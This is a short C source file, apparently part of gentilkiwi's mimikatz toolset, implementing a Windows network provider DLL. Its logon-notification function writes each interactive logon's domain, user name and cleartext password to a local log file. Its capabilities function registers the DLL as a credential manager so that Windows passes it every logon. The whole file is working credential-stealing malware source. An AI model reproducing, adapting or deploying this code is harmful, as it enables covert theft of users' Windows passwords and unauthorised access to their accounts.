/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "knp.h"

DWORD WINAPI knp_NPLogonNotify(PLUID lpLogonId, LPCWSTR lpAuthentInfoType, LPVOID lpAuthentInfo, LPCWSTR lpPreviousAuthentInfoType, LPVOID lpPreviousAuthentInfo, LPWSTR lpStationName, LPVOID StationHandle, LPWSTR *lpLogonScript)
{
	FILE *knp_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(knp_logfile = _wfopen(L"kiwinp.log", L"a"))
#pragma warning(pop)
	{	// MSV1_0_INTERACTIVE_LOGON ~= KERB_INTERACTIVE_LOGON
		klog(knp_logfile, L"[%08x:%08x] %s %wZ\\%wZ\t", lpLogonId->HighPart, lpLogonId->LowPart, lpAuthentInfoType, &((PMSV1_0_INTERACTIVE_LOGON) lpAuthentInfo)->LogonDomainName, &((PMSV1_0_INTERACTIVE_LOGON) lpAuthentInfo)->UserName);
		klog_password(knp_logfile, &((PMSV1_0_INTERACTIVE_LOGON) lpAuthentInfo)->Password);
		klog(knp_logfile, L"\n");
		fclose(knp_logfile);
	}
	*lpLogonScript = NULL;
	return WN_SUCCESS;
}

DWORD WINAPI knp_NPGetCaps(DWORD nIndex)   
{
	DWORD dwRes;   
	switch (nIndex)   
	{   
	case WNNC_NET_TYPE:   
		dwRes = WNNC_CRED_MANAGER;
		break;   
	case WNNC_SPEC_VERSION:   
		dwRes = WNNC_SPEC_VERSION51;
		break;   
	case WNNC_START:   
		dwRes = WNNC_WAIT_FOR_START;
		break;   
	default:   
		dwRes = 0;
		break;   
	}   
	return dwRes;   
}